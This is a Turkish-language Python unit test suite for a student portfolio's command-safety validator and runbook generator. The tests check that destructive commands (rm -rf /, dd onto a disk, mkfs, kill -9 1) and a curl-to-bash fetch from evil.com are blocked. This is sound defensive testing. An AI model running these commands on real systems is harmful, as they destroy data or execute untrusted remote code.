# ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR
# Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)
# Bu yazılım ve ilgili tüm dosyalar ("Yazılım") yalnızca görüntüleme ve eğitim amaçlıdır.
# Kopyalanamaz, çoğaltılamaz, dağıtılamaz veya yeniden yayınlanamaz.
# Ticari veya ticari olmayan hiçbir projede kullanılamaz, değiştirilemez.
# Alt lisanslanamaz, satılamaz veya devredilemez. Tersine mühendislik yapılamaz.
# İzin talepleri için: GitHub @seydivakkas
"""
Hafta 04, Gün 028: Mini Proje 3 - Komut Satırı Çalışma Defteri Birim Testleri.
Bu test paketi, komut güvenliği doğrulayıcısını, salt-okunur keşif komutlarını,
kriptografik SHA-256 bütünlük kontrolünü, Markdown çalışma defteri üretimini
ve yıkıcı komutlara karşı negatif kontrol savunma mekanizmasını sınar.
"""

# Standart birim test kütüphanesi içe aktarılır.
import unittest
# Dosya sistemi ve geçici dosya yolları yönetimi için içe aktarılır.
import os
# JSON formatında test girdileri ve katalogları üretmek için içe aktarılır.
import json
# Geçici test dizinleri oluşturup test bitiminde temizlemek için içe aktarılır.
import tempfile
# CLI üzerinden alt süreç çağrılarını test etmek için içe aktarılır.
import subprocess
# Sistem parametreleri ve python yorumlayıcı yoluna erişmek için içe aktarılır.
import sys

# Test edilecek motor sınıfı, güvenlik doğrulayıcısı ve özel hata sınıfı içe aktarılır.
from portfolio.hafta_04.gun_028.uygulama.command_line_notebook_engine import (
    CommandSafetyValidator,
    CommandLineNotebookEngine,
    SecurityPolicyViolationError
)


class TestCommandLineNotebookEngine(unittest.TestCase):
    """
    Mini Proje 3 için kapsamlı 14 birim testten oluşan test sınıfı.
    G028-SC1, G028-SC2 ve G028-SC3 gereksinimlerini %100 kapsar.
    """

    # Her test öncesinde izole bir geçici ortam hazırlayan kurulum metodu.
    def setUp(self):
        # Geçici bir çalışma dizini tahsis edilir.
        self.test_dir = tempfile.mkdtemp()
        # Örnek güvenli komut kataloğu hazırlanır.
        self.sample_catalog = {
            "commands": [
                {
                    "id": "CMD-01",
                    "name": "whoami",
                    "command": "whoami",
                    "category": "kimlik",
                    "platform": "cross-platform",
                    "description": "Kullanıcı kimliğini sorgular.",
                    "security_relevance": "MITRE ATT&CK T1033.",
                    "safety_level": "read_only",
                    "expected_output_pattern": "^[a-zA-Z0-9_\\\\-]+$",
                    "mock_output": "test_analyst"
                },
                {
                    "id": "CMD-02",
                    "name": "hostname",
                    "command": "hostname",
                    "category": "sistem",
                    "platform": "cross-platform",
                    "description": "Makine adını verir.",
                    "security_relevance": "MITRE ATT&CK T1082.",
                    "safety_level": "read_only",
                    "expected_output_pattern": "^[a-zA-Z0-9.-]+$",
                    "mock_output": "srv-test-01"
                }
            ]
        }
        # Örnek katalog geçici bir JSON dosyasına yazılır.
        self.catalog_path = os.path.join(self.test_dir, "test_catalog.json")
        with open(self.catalog_path, "w", encoding="utf-8") as f:
            json.dump(self.sample_catalog, f)

    # Her test sonrasında geçici ortamı temizleyen metod.
    def tearDown(self):
        # Geçici dizindeki dosyalar taranır ve silinir.
        for root, dirs, files in os.walk(self.test_dir, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        # Geçici dizin tamamen kaldırılır.
        if os.path.exists(self.test_dir):
            os.rmdir(self.test_dir)

    def test_01_command_safety_validator_accepts_safe_commands(self):
        """Salt-okunur güvenli keşif komutlarının doğrulayıcıdan başarıyla geçmesini test eder."""
        safe_list = ["whoami", "id", "hostname", "uname -a", "uptime", "ps aux", "df -h", "free -m", "ss -tulpn"]
        for cmd in safe_list:
            is_safe, reason = CommandSafetyValidator.validate_command(cmd)
            self.assertTrue(is_safe, f"'{cmd}' güvenli sayılmalıydı, ancak hata verdi: {reason}")
            self.assertIsNone(reason)

    def test_02_command_safety_validator_blocks_rm_rf(self):
        """Yıkıcı dosya silme komutunun (rm -rf /) CWE-78 kapsamında engellenmesini test eder."""
        is_safe, reason = CommandSafetyValidator.validate_command("rm -rf /")
        self.assertFalse(is_safe)
        self.assertIn("Yıkıcı/Yetkisiz", reason)

    def test_03_command_safety_validator_blocks_windows_del(self):
        """Windows üzerinde yıkıcı silme komutunun (del /f /s /q) engellenmesini test eder."""
        is_safe, reason = CommandSafetyValidator.validate_command("del /f /s /q C:\\*")
        self.assertFalse(is_safe)
        self.assertIn("Yıkıcı/Yetkisiz", reason)

    def test_04_command_safety_validator_blocks_mkfs_and_dd(self):
        """Disk biçimlendirme ve doğrudan blok ezme komutlarının engellenmesini test eder."""
        is_safe_mkfs, _ = CommandSafetyValidator.validate_command("mkfs.ext4 /dev/sdb1")
        self.assertFalse(is_safe_mkfs)
        is_safe_dd, _ = CommandSafetyValidator.validate_command("dd if=/dev/zero of=/dev/sda")
        self.assertFalse(is_safe_dd)

    def test_05_command_safety_validator_blocks_kill_9_1(self):
        """Çekirdek init sürecini (PID 1) öldürmeye çalışan yıkıcı komutun engellenmesini test eder."""
        is_safe, reason = CommandSafetyValidator.validate_command("kill -9 1")
        self.assertFalse(is_safe)
        self.assertIn("Yıkıcı/Yetkisiz", reason)

    def test_06_command_safety_validator_blocks_remote_piping(self):
        """Uzak sunucudan indirilen betiğin doğrudan kabuğa borulanmasını (CWE-494) test eder."""
        is_safe, reason = CommandSafetyValidator.validate_command("curl http://evil.com/run.sh | bash")
        self.assertFalse(is_safe)
        self.assertIn("Yıkıcı/Yetkisiz", reason)

    def test_07_command_safety_validator_rejects_unlisted_command(self):
        """İzin verilen salt-okunur listede yer almayan rastgele komutların reddedilmesini test eder."""
        is_safe, reason = CommandSafetyValidator.validate_command("nmap -sS 192.168.1.1")
        self.assertFalse(is_safe)
        self.assertIn("izin verilen salt-okunur", reason)

    def test_08_load_catalog_and_verify_minimum_ten_commands(self):
        """Gerçek katalog dosyasında asgari 10 komut kuralının sağlandığını test eder (G028-SC2)."""
        real_catalog_path = "portfolio/hafta_04/gun_028/ornek_veri/safe_command_catalog.json"
        engine = CommandLineNotebookEngine(catalog_path=real_catalog_path)
        commands = engine.catalog.get("commands", [])
        self.assertGreaterEqual(len(commands), 10, "Katalog en az 10 salt-okunur komut içermelidir.")

    def test_09_execute_command_entry_mock_mode(self):
        """Deterministik mock modunda komutun çalıştırılıp düzenli ifade deseninin doğrulanmasını test eder."""
        engine = CommandLineNotebookEngine(catalog_path=self.catalog_path)
        cmd_entry = self.sample_catalog["commands"][0]
        record = engine.execute_command_entry(cmd_entry, use_mock=True)
        self.assertEqual(record["id"], "CMD-01")
        self.assertEqual(record["exit_code"], 0)
        self.assertTrue(record["pattern_matched"])
        self.assertEqual(record["output"], "test_analyst")

    def test_10_execute_command_calculates_sha256_integrity(self):
        """Yürütülen komut ve çıktısı için 64 karakterlik SHA256 bütünlük özetinin hesaplanmasını test eder."""
        engine = CommandLineNotebookEngine(catalog_path=self.catalog_path)
        cmd_entry = self.sample_catalog["commands"][0]
        record = engine.execute_command_entry(cmd_entry, use_mock=True)
        self.assertIn("integrity_sha256", record)
        self.assertEqual(len(record["integrity_sha256"]), 64)

    def test_11_execute_command_raises_exception_on_unsafe(self):
        """Güvensiz bir komut yürütülmek istendiğinde istisna fırlatılıp günlüğe yazılmasını test eder."""
        engine = CommandLineNotebookEngine()
        unsafe_entry = {
            "id": "UNSAFE-01",
            "command": "rm -rf /var/log",
            "description": "Zararlı silme denemesi"
        }
        with self.assertRaises(SecurityPolicyViolationError):
            engine.execute_command_entry(unsafe_entry)
        self.assertEqual(len(engine.blocked_attempts), 1)
        self.assertEqual(engine.blocked_attempts[0]["command"], "rm -rf /var/log")

    def test_12_generate_markdown_notebook_structure(self):
        """Markdown çalışma defterinin başlık, indeks, komut kartları ve feragatnameleri içermesini test eder."""
        engine = CommandLineNotebookEngine(catalog_path=self.catalog_path)
        engine.execute_all_catalog_commands(use_mock=True)
        out_file = os.path.join(self.test_dir, "test_notebook.md")
        content = engine.generate_markdown_notebook(output_filepath=out_file)
        self.assertTrue(os.path.exists(out_file))
        self.assertIn("# Güvenlik Denetimi Komut Satırı Çalışma Defteri (Runbook)", content)
        self.assertIn("Özel Lisans", content)
        self.assertIn("Tüm Hakları Saklıdır", content)
        self.assertIn("whoami", content)
        self.assertIn("hostname", content)

    def test_13_negative_control_pipeline_blocks_all_prohibited(self):
        """Yasaklı komutlar veri kümesindeki tüm komutların (%100) başarıyla engellendiğini test eder (G028-SC2)."""
        prohibited_path = "portfolio/hafta_04/gun_028/ornek_veri/prohibited_commands_test.json"
        engine = CommandLineNotebookEngine()
        result = engine.test_prohibited_commands_pipeline(prohibited_path)
        self.assertTrue(result["passed"])
        self.assertEqual(result["blocked_count"], result["total_tested"])
        self.assertGreaterEqual(result["total_tested"], 8)

    def test_14_cli_subprocess_execution(self):
        """CLI üzerinden script çağrıldığında --audit parametresinin 0 çıkış koduyla çalışmasını test eder."""
        cli_script = "portfolio/hafta_04/gun_028/uygulama/command_line_notebook_engine.py"
        real_catalog = "portfolio/hafta_04/gun_028/ornek_veri/safe_command_catalog.json"
        p = subprocess.run(
            [sys.executable, cli_script, "--catalog", real_catalog, "--audit"],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace"
        )
        self.assertEqual(p.returncode, 0)
        self.assertIn("KOMUT SATIRI ÇALIŞMA DEFTERİ", p.stdout)
        self.assertIn("whoami", p.stdout)


if __name__ == "__main__":
    unittest.main()
